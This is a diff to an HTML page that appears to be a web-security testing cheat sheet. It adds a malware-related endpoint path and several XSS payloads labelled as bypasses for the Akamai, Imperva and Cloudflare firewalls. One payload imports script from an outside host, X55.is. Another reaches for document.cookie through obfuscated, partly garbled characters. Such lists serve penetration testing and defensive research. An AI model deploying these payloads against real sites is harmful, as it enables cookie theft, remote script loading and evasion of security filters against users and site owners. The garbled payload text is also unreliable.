@@ -160,6 +160,7 @@
 <p>Interesting not common endpoints:</p>
 <div class="highlight"><pre><span></span><code>/_vti_pvt/service.pwd # https://stackoverflow.com/questions/1163820/what-are-vti-cnf-vti-pvt-vti-script-and-vti-txt-folders
 /__better_errors # https://github.com/BetterErrors/better_errors?tab=readme-ov-file#better-errors - Debug console can allow RCE
+home/000~ROOT~000 # https://github.com/stefanpejcic/wordpress-malware/blob/9b74dec23ed0e8041f9c49de1fcd568f5342796e/23.10.2020/sy.php - Symlink attack already carried out by other attackers
 </code></pre></div>
 <h2 id="broken-access-control">Broken Access Control</h2>
 <p>Here's a list of worth-to-try restriction bypasses:</p>
@@ -517,6 +518,14 @@ This behaviour can be overridden by setting the  header <code>Referrer-Policy</c
 <div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">data:</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&amp;Xopf;=alert;&amp;Xopf;</span> <span class="err">(</span><span class="na">1</span><span class="err">)</span><span class="p">&gt;</span>
 
 xss"&gt;<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">srcdoc</span><span class="o">=</span><span class="s">"%26lt;script</span><span class="p">&gt;</span>;prompt`${document.domain}`%26lt;/script&gt;'&gt;
+</code></pre></div>
+<p>Bypass Akamai, Imperva and CloudFlare:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span> <span class="na">HRef</span><span class="o">=</span><span class="s">//X55.is</span> <span class="na">AutoFocus</span> <span class="err">%</span><span class="na">26</span><span class="err">%</span><span class="na">2362</span> <span class="na">OnFocus</span><span class="err">%</span><span class="na">0C</span><span class="o">=</span><span class="s">import(href)</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Bypass CloudFlare:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="n">svg</span><span class="w"> </span><span class="n">onload</span><span class="o">=</span><span class="n">alert</span><span class="o">&amp;</span><span class="c1">#00&cent;</span>
+
+<span class="n">dedocument</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="n">cookie</span><span class="p">)</span><span class="o">&gt;</span>
 </code></pre></div>
 <p>Every HTML tag has the <code>baseURI</code> property. Using <code>&lt;base&gt;</code> allows you to change the <code>baseURI</code>:</p>
 <div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">base</span> <span class="na">href</span><span class="o">=</span><span class="s">x:alert(1)</span> <span class="na">onfocus</span><span class="o">=</span><span class="s">eval(baseURI)</span> <span class="na">tabindex</span><span class="o">=</span><span class="s">1</span> <span class="na">style</span><span class="o">=</span><span class="s">display:block</span> <span class="na">autofocus</span><span class="p">&gt;</span>
